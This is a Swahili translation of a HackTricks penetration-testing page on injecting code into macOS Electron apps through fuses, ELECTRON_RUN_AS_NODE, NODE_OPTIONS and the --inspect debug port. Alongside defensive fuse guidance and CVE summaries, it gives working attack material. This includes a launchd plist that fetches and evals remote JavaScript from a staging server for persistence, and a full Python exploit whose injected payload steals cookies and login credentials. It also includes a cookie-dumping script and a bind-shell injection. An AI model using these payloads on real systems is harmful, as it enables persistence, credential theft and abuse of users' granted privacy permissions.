# Uingizaji kwenye Programu za Electron za macOS

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Ikiwa hujui Electron ni nini, unaweza kupata [**taarifa nyingi hapa**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation). Lakini kwa sasa, fahamu tu kwamba Electron huendesha **node**.\
Na node ina **vigezo** na **env variables** ambazo zinaweza kutumiwa **kuifanya itekeleze code nyingine** pamoja na faili iliyoainishwa.

Kwa sharti la awali la uandishi wa ndani kwenye mifumo mbalimbali na njia za ASAR/V8 snapshot, angalia [Electron local code injection and snapshot tampering](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md).

### Electron Fuses

Mbinu hizi zitajadiliwa baadaye, lakini hivi majuzi Electron imeongeza **security flags kadhaa ili kuzizuia**. Hizi ni [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), na hizi ndizo zinazotumika **kuzuia** programu za Electron kwenye macOS **kupakia code holela**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Ikiwa imezimwa, huzuia matumizi ya env var **`ELECTRON_RUN_AS_NODE`** ili kuingiza code.
- **`EnableNodeCliInspectArguments`**: Ikiwa imezimwa, params kama `--inspect`, `--inspect-brk` hazitazingatiwa. Hivyo kuzuia njia hii ya kuingiza code.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewashwa, **file** ya **`asar`** iliyopakiwa **itathibitishwa** na macOS. Hivyo **kuzuia** **uingizaji wa code** kwa kurekebisha yaliyomo kwenye faili hii.
- **`OnlyLoadAppFromAsar`**: Ikiwa hii imewashwa, badala ya kutafuta na kupakia kwa mpangilio huu: **`app.asar`**, **`app`**, na mwishowe **`default_app.asar`**, itakagua na kutumia `app.asar` pekee. Hii inahakikisha kwamba **ikiunganishwa** na fuse ya **`embeddedAsarIntegrityValidation`**, haiwezekani **kupakia code ambayo haijathibitishwa**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewashwa, browser process hutumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa V8 snapshot yake.

Fuse nyingine ya kuvutia ambayo haitazuia uingizaji wa code ni:

- **EnableCookieEncryption**: Ikiwashwa, cookie store iliyo kwenye diski husimbwa kwa kutumia funguo za usimbaji fiche za kiwango cha OS.

### Kukagua Electron Fuses

Unaweza **kukagua flags hizi** kutoka kwenye programu kwa kutumia:

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Kurekebisha Electron Fuses

Kama [**nyaraka zinavyotaja**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Electron Fuses** hufanywa ndani ya **Electron binary**, ambayo ina string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** mahali fulani.<sup>[[1]](#references)</sup>

Katika programu za macOS, kwa kawaida hupatikana katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

Unaweza kupakia faili hii kwenye [https://hexed.it/](https://hexed.it/) na kutafuta mfuatano uliotangulia. Baada ya mfuatano huu, utaona nambari ya ASCII "0" au "1" inayoonyesha ikiwa kila fuse imezimwa au imewashwa. Rekebisha tu msimbo wa hex (`0x30` ni `0` na `0x31` ni `1`) ili **kubadilisha thamani za fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Kumbuka kuwa ukijaribu **kubadilisha** binary ya **`Electron Framework`** ndani ya programu kwa kutumia baiti hizi zilizorekebishwa, programu haitafanya kazi.

## RCE kwa kuongeza msimbo kwenye Electron Applications

Huenda kukawa na **faili za JS/HTML za nje** zinazotumiwa na Electron App, kwa hivyo mshambulizi anaweza kuingiza msimbo kwenye faili hizi, ambao sahihi yake haitakaguliwa, na kutekeleza msimbo wowote katika muktadha wa programu.

> [!CAUTION]
> Hata hivyo, kwa sasa kuna vikwazo 2:
>
> - Ruhusa ya **`kTCCServiceSystemPolicyAppBundles`** **inahitajika** ili kurekebisha App, kwa hivyo kwa chaguomsingi hili haliwezekani tena.
> - Faili ya **`asap`** iliyokompailiwa kwa kawaida huwa na fuse **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** **zimewashwa**
>
> Hili hufanya njia hii ya shambulio kuwa ngumu zaidi (au isiwezekane).

Kumbuka kuwa inawezekana kukwepa sharti la **`kTCCServiceSystemPolicyAppBundles`** kwa kunakili programu kwenye saraka nyingine (kama **`/tmp`**), kubadilisha jina la folda **`app.app/Contents`** kuwa **`app.app/NotCon`**, **kurekebisha** faili ya **asar** kwa kutumia msimbo wako **hasidi**, kuibadilisha tena kuwa **`app.app/Contents`** na kuitekeleza.<sup>[[5]](#references)</sup>

Unaweza kufungua msimbo kutoka kwenye faili ya asar kwa kutumia:

```bash
npx asar extract app.asar app-decomp
```

Na uipakie tena baada ya kuirekebisha kwa kutumia:

```bash
npx asar pack app-decomp app-new.asar
```

## RCE with ELECTRON_RUN_AS_NODE

Kulingana na [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ikiwa kigezo hiki cha mazingira kimewekwa, mchakato utaanzishwa kama mchakato wa kawaida wa Node.js.<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> Ikiwa fuse **`RunAsNode`** imezimwa, env var **`ELECTRON_RUN_AS_NODE`** itapuuzwa, na hii haitafanya kazi.

### Injection kutoka kwenye App Plist

Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia vibaya env variable hii katika plist ili kudumisha persistence:<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## RCE na `NODE_OPTIONS`

Unaweza kuhifadhi payload kwenye faili tofauti na kuitekeleza:

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** **imezimwa**, app **itapuuza** env var **NODE_OPTIONS** inapozinduliwa, isipokuwa env var **`ELECTRON_RUN_AS_NODE`** iwekwe; nayo pia **itapuuzwa** ikiwa fuse **`RunAsNode`** imezimwa.
>
> Usipoweka **`ELECTRON_RUN_AS_NODE`**, utaona **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection kutoka kwenye App Plist

Unaweza kutumia vibaya env variable hii kwenye plist ili kudumisha persistence kwa kuongeza keys hizi:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## RCE kupitia inspection

Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ukiendesha programu ya Electron yenye flags kama **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **debug port itafunguliwa** ili uweze kuunganishwa nayo (kwa mfano, kupitia Chrome kwenye `chrome://inspect`) na utaweza **kuingiza code ndani yake** au hata kuzindua processes mpya.<sup>[[7]](#references)</sup>\
Kwa mfano:

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

Katika [**chapisho hili la blogu**](https://hackerone.com/reports/1274695), debugging hii hutumiwa vibaya kuifanya headless chrome **ipakue faili zozote katika maeneo yoyote**.<sup>[[8]](#references)</sup>

> [!TIP]
> Ikiwa app ina njia yake maalum ya kuangalia kama env variables au params kama `--inspect` zimewekwa, unaweza kujaribu kuikwepa wakati wa runtime kwa kutumia arg `--inspect-brk`, ambayo **itasimamisha utekelezaji** mwanzoni mwa app na kutekeleza bypass (kwa mfano, kubadilisha args au env variables za process ya sasa).

Huu hapa ni exploit ambapo, kwa kufuatilia na kuendesha app kwa param `--inspect-brk`, iliwezekana kukwepa ulinzi maalum uliokuwa nao (kwa kubadilisha params za process na kuondoa `--inspect-brk`) na kisha kuingiza payload ya JS ili kutoa cookies na credentials kutoka kwenye app:

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> Ikiwa fuse **`EnableNodeCliInspectArguments`** imezimwa, app itapuuza **vigezo vya node** (kama `--inspect`) inapozinduliwa, isipokuwa kigezo cha mazingira **`ELECTRON_RUN_AS_NODE`** kimewekwa. Hata hivyo, nacho **kitapuuzwa** ikiwa fuse **`RunAsNode`** imezimwa.
>
> Hata hivyo, bado unaweza kutumia **param ya electron `--remote-debugging-port=9229`**, lakini payload ya awali haitafanya kazi kutekeleza michakato mingine.

Kwa kutumia param **`--remote-debugging-port=9222`**, inawezekana kuiba taarifa fulani kutoka kwenye Electron App, kama **historia** (kwa kutumia amri za GET) au **cookies** za browser (kwa kuwa **huondolewa usimbaji fiche** ndani ya browser na kuna **endpoint ya json** inayozitoa).

Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), na kutumia tool ya kiotomatiki [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### Injection kutoka kwenye App Plist

Unaweza kutumia vibaya env variable hii kwenye plist ili kudumisha persistence kwa kuongeza funguo hizi:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## TCC Bypass kwa kutumia Matoleo ya Zamani

> [!TIP]
> TCC daemon ya macOS haikagui toleo la application lililoendeshwa. Kwa hiyo, ikiwa **huwezi kuingiza code kwenye Electron application** kwa kutumia mbinu zozote zilizotangulia, unaweza kupakua toleo la zamani la APP na kuingiza code ndani yake, kwa kuwa bado litapata TCC privileges (isipokuwa Trust Cache izuie).

## Kuendesha Code Isiyo ya JS

Mbinu zilizotangulia zitakuwezesha kuendesha **JS code ndani ya process ya Electron application**. Hata hivyo, kumbuka kwamba **child processes huendeshwa chini ya sandbox profile ileile** na parent application na **hurithi TCC permissions zake**.\
Kwa hiyo, ikiwa unataka kutumia vibaya entitlements ili kufikia kamera au maikrofoni, kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwenye process**.

## Vulnerabilities Maarufu za Electron macOS (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 na matoleo mbalimbali ya awali ya 23-27 yalimruhusu mshambuliaji mwenye write access kwenye folda ya `.app/Contents/Resources` kupita fuses za `embeddedAsarIntegrityValidation` **na** `onlyLoadAppFromAsar`. Hitilafu ilikuwa *file-type confusion* kwenye integrity checker iliyowezesha **directory iliyoundwa kwa jina `app.asar`** kupakiwa badala ya archive iliyothibitishwa, hivyo JavaScript yoyote iliyowekwa ndani ya directory hiyo iliendeshwa wakati app ilipoanzishwa. Kwa hiyo, hata vendors waliofuata mwongozo wa hardening na kuwasha fuses zote mbili bado walikuwa hatarini kwenye macOS.<sup>[[3]](#references)</sup>

Matoleo ya Electron yaliyorekebishwa: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** na **27.0.0-alpha.7**. Washambuliaji wanaogundua application inayoendesha build ya zamani wanaweza kubadilisha `Contents/Resources/app.asar` na directory yao ili kuendesha code yenye TCC entitlements za application.<sup>[[3]](#references)</sup> 

### Kundi la CVE za “RunAsNode” / “enableNodeCliInspectArguments” za 2024

Mnamo Januari 2024, mfululizo wa CVE (CVE-2024-23738 hadi CVE-2024-23743) ulionyesha kwamba Electron apps nyingi husambazwa zikiwa na fuses za **RunAsNode** na **EnableNodeCliInspectArguments** bado zimewashwa. Kwa hiyo, mshambuliaji wa ndani anaweza kuanzisha upya program kwa kutumia environment variable `ELECTRON_RUN_AS_NODE=1` au flags kama `--inspect-brk` ili kuibadilisha kuwa process ya *generic* ya Node.js na kurithi sandbox na TCC permissions zote za application.<sup>[[4]](#references)</sup>

Ingawa timu ya Electron ilipinga ukadiriaji wa “critical” na kubainisha kwamba mshambuliaji tayari anahitaji uwezo wa kutekeleza code ndani ya kifaa, suala hili bado lina manufaa wakati wa post-exploitation kwa kuwa hubadilisha Electron bundle yoyote iliyo hatarini kuwa binary ya *living-off-the-land* inayoweza, kwa mfano, kusoma Contacts, Photos au rasilimali nyingine nyeti ambazo desktop app ilikuwa tayari imepewa ruhusa ya kufikia.<sup>[[4]](#references)</sup>

Mwongozo wa ulinzi kutoka kwa wasimamizi wa Electron:<sup>[[4]](#references)</sup>

* Zima fuses za `RunAsNode` na `EnableNodeCliInspectArguments` kwenye production builds.
* Tumia API mpya zaidi ya **UtilityProcess** ikiwa application yako inahitaji kihalali helper Node.js process, badala ya kuwasha tena fuses hizo. 

## Injection ya Kiotomatiki

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool ya [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumika kwa urahisi **kutafuta electron applications zilizo hatarini** zilizowekwa na kuziingizia code. Tool hii itajaribu kutumia mbinu ya **`--inspect`**:<sup>[[5]](#references)</sup>

Unahitaji kuikompili mwenyewe na unaweza kuitumia hivi:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki iliundwa kuweka backdoor kwenye Electron applications kwa kubadilisha faili za JavaScript za applications na faili za JavaScript za Loki Command & Control.

## References

- [1] [Fuses za Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Injection ya macOS kupitia Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Kukwepa ASAR Integrity kupitia mkanganyiko wa filetype (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Taarifa kuhusu CVEs za 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - Kuweka macOS Privacy kwenye Electron - Silaha Mpya katika Hifadhi Yako ya Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Kwa nini Electron apps haziwezi kuhifadhi siri zako kwa usiri: chaguo la --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Ripoti ya HackerOne #1274695 - Utatuzi wa Electron ulitumiwa vibaya kupakua faili holela](https://hackerone.com/reports/1274695)
- [9] [Mikono kwenye Mtungi wa Cookie: Kutoa Cookies kwa kutumia Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Kutafuta Chanzo cha Kushindwa kwa Utoaji wa Cookies kwa kutumia Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
